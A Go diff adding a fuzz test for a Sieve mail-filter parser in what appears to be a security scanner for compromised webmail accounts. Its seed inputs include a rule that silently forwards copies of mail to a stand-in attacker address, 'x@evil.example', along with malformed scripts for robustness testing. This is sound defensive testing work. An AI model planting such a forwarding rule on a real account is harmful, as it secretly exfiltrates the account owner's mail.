@@ -421,6 +421,30 @@ func FuzzParseEximFilter(f *testing.F) {
 	})
 }
 
+func FuzzParseSieveFilter(f *testing.F) {
+	// Sieve scripts are attacker-controlled once a webmail account is
+	// compromised (Roundcube writes them from the filter UI). The tokenizer and
+	// parser must walk any input without panicking or running off the buffer.
+	f.Add("require [\"copy\"];\nif true\n{\n\tredirect :copy \"x@evil.example\";\n}\n")
+	f.Add("if header :contains \"subject\" \"x\" { redirect \"a@b.com\"; keep; }")
+	f.Add("/* unterminated block comment redirect \"x@y\"")
+	f.Add("redirect :copy") // tag, no dest, no semicolon
+	f.Add("if { }")         // empty test and block
+	f.Add("} } }")          // stack underflow attempts
+	f.Add("fileinto")       // action with no arg or terminator
+	f.Add("\"unterminated string")
+	f.Add(":::::")   // pathological tags
+	f.Add("[[[,,,]") // dangling list punctuation
+	f.Add("")
+	f.Add("# comment only\n")
+	f.Fuzz(func(t *testing.T, content string) {
+		rules := parseSieveFilter(content)
+		mb := filterMailbox{localPart: "u", domain: "example.com"}
+		_ = scoreFilterRules(rules, mb, map[string]bool{"example.com": true}, nil)
+		_ = sieveTestMatchesAll(tokenizeSieve(content))
+	})
+}
+
 func FuzzParseZoneSecurity(f *testing.F) {
 	// Zone files in /var/named are attacker-controlled once a panel account is
 	// compromised. The line/owner/paren walker and the provenance scanner must
